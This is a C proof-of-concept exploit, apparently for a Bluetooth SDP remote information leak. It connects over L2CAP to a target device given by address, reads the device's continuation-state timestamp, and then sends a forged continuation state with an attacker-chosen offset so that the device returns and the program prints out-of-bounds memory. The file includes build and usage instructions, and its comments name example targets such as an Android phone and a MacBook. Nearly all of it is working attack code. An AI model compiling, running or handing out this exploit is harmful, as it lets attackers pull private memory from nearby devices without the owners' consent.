//copyright @
//huahuaisadog@gmail.com

/***
***Only for linux devices***
usage:
$ gcc -o test poc_remote_info_leak.c -lbluetooth
$ sudo ./test TARGET_ADDR LEAK_OFFSET
***/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>          
#include <sys/socket.h>
#include <arpa/inet.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
//#include "l2cap_enviroment.h"

#define __u8 unsigned char
#define __le16 unsigned short
#define __le32 unsigned int

struct l2cap_cmd_hdr {
	__u8       code;
	__u8       ident;
	__le16     len;
};
struct l2cap_conn_req {
	__le16     psm;
	__le16     scid;
};

struct l2cap_conf_req {
	__le16     dcid;
	__le16     flags;
	__u8       data[0];
};

struct l2cap_conf_rsp {
	__le16     scid;
	__le16     flags;
	__le16     result;
};

struct l2cap_conf_opt {
	__u8 type;
	__u8 len;
};

struct fack_opt{
	__u8 type;
	__u8 len;
	__le16 val;
};

struct l2cap_conf_efs {
	__u8 id;
	__u8 stype;
	__le16 msdu;
	__le32 sdu_itime;
	__le32 acc_lat;
	__le32 flush_to;
};

typedef struct sdp_pdu_hdr{
	uint8_t  pdu_id;
	uint16_t tid;
	uint16_t plen;
} __attribute__ ((packed)) sdp_pdu_hdr_t;

typedef struct {
	uint32_t timestamp;
	union {
		uint16_t maxBytesSent;
		uint16_t lastIndexSent;
	} cStateValue;
} sdp_cont_state_t;


#define HEAD_LEN (sizeof(struct l2cap_cmd_hdr))
static int parse_conn_req(void *buffer, __u8 ident, __le16 len, void *data) {
	struct l2cap_cmd_hdr head;
	head.code = L2CAP_CONN_REQ;
	head.ident = ident;
	head.len = len;
	memcpy(buffer, &head, sizeof(head));
	memcpy(buffer + sizeof(head), data, len);
}


#define SDP_SVC_SEARCH_ATTR_REQ 0x6
static int parse_sdp_search_attr_req(void *buffer, __le16 data_len, void *data){
	sdp_pdu_hdr_t pdu_head;
	int i;
	__le16 tmp;
	
	memset(&pdu_head, 0, sizeof(pdu_head));
	pdu_head.pdu_id = SDP_SVC_SEARCH_ATTR_REQ;
	pdu_head.tid = 0;
	tmp = ((data_len & 0xff) << 8 ) + ((data_len >> 8) & 0xff);
	pdu_head.plen = tmp;
	memcpy(buffer, &pdu_head, sizeof(pdu_head));
	memcpy(buffer + sizeof(pdu_head), data, data_len);
	return data_len + sizeof(pdu_head);
}

int main(int argc ,char* argv[]){
	int sock_fd, ret;
	int total_len;
	int i;
	int leek_offset;
	void *buf, *data, *recv_buf;
	unsigned int *leek_data;
	unsigned char *p, *timestamp;
	char dest[18];
	struct sockaddr_l2 local_l2_addr;
	struct sockaddr_l2 remote_l2_addr;
	struct fack_opt fack;

	if(argc != 3){
		printf("usage : sudo ./test TARGET_ADDR LEAK_OFFSET\n");
		return -1;
	}
	strncpy(dest, argv[1], 18);
	leek_offset = strtol(argv[2], NULL, 16);
	//char dest[18] = "48:db:50:02:c6:71";  //aosp angler
	//char dest[18] = "dc:a9:04:86:45:cc";   // macbookpro
	//char dest[18] = "00:1A:7D:DA:71:14"; //linux
	// = "00:1a:7d:da:71:13"; //panyu
	//printf("%s\n", dest);
	

	sock_fd = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_L2CAP);
	if(sock_fd == -1){
		perror("[-]socket create failed : ");
		return -1;
	}

	memset(&local_l2_addr, 0, sizeof(struct sockaddr_l2));
	local_l2_addr.l2_family = PF_BLUETOOTH;
	memcpy(&local_l2_addr.l2_bdaddr , BDADDR_ANY, sizeof(bdaddr_t));


	ret = bind(sock_fd, (struct sockaddr*) &local_l2_addr, sizeof(struct sockaddr_l2));
	if(ret == -1){
		perror("[-]bind()");
		goto out;
	}

	memset(&remote_l2_addr, 0, sizeof(remote_l2_addr));
	remote_l2_addr.l2_family = PF_BLUETOOTH;
	remote_l2_addr.l2_psm = htobs(0x1);
	str2ba(dest, &remote_l2_addr.l2_bdaddr);


	if(connect(sock_fd, (struct sockaddr *) &remote_l2_addr,sizeof(remote_l2_addr)) < 0) {  
  		perror("[-]Can't connect");  
		goto out;  
	} 

	sleep(2);

	//send sdp search arrt req to get timestamp
	buf = malloc(0x100);
	memset(buf, 0, 0x100);
	char first_data[] = "\x35\x03\x19\x01\x00" // L2CAP PATTERN
					  "\x00\x10"  // max attr byte count
					  "\x35\x05\x0a\x00\x00\xff\xff" //aatr id list
					  "\x00"; //continue state
	total_len = parse_sdp_search_attr_req(buf, sizeof(first_data) - 1, first_data);


	//printf("%d\n", ((sdp_pdu_hdr_t *)buf)->tid);
	send(sock_fd, buf, total_len,0);

	//recv timestamp of target
	recv_buf = malloc(0x1000);
	memset(recv_buf, 0, 0x100);
	sleep(1);
	ret = recv(sock_fd, recv_buf, 0x100, 0);
	if(ret == -1){
		perror("[-]recv : ");
		goto clean;
	}
	timestamp = recv_buf + ret - 8;
	
	//send vul search_attr_req to get leak data
	sdp_cont_state_t vul_cstate;
	char tmp_data[] = "\x35\x03\x19\x01\x00" // L2CAP PATTERN
					  "\xff\xff"  // max attr byte count
					  "\x35\x05\x0a\x00\x00\xff\xff" //aatr id list
					  "\x08"; //continue state size
	char second_data[100] = {'\0'};
	memcpy(&vul_cstate.timestamp, timestamp, 4);
	vul_cstate.cStateValue.maxBytesSent = leek_offset;  //leek data offset   

	memcpy(second_data, tmp_data, sizeof(tmp_data) - 1);
	memcpy(second_data + sizeof(tmp_data) - 1, &vul_cstate, 8);

	total_len = parse_sdp_search_attr_req(buf, sizeof(tmp_data) - 1 + 8, second_data);
	send(sock_fd, buf, total_len, 0);

	//recv leek data
	ret = recv(sock_fd, recv_buf, 0x1000, 0);
	if(ret == -1) {
		perror("[-]recv : ");
		goto clean;
	}
	leek_data = (unsigned int *)(recv_buf + 0x10);
	printf("leak_data : \n");
	for(i = 0; i < ret/sizeof(unsigned int) ; i++) {
		if(i % 4 == 0)
			printf("%08x : ", i/4 * 0x10);
		printf("%08x " ,leek_data[i]);
		if(i % 4 == 3)
			printf("\n");
	}

	printf("[+]test done\n");
clean:
	free(buf);
	free(recv_buf);
out:
	close(sock_fd);
	return 0; 
}
